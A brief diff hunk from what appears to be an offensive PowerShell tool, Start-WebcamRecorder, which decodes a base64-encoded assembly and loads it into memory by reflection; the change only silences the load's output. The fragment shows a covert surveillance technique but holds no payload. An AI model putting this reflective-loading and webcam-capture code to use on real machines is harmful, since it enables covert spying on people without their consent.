@@ -64,7 +64,7 @@ function Start-WebcamRecorder
   $bytes = [Convert]::FromBase64String($encMergedAssembly)
   try 
   {
-    [System.Reflection.Assembly]::Load($bytes) 
+    [System.Reflection.Assembly]::Load($bytes) | Out-Null
   }
   catch [Exception]
   {
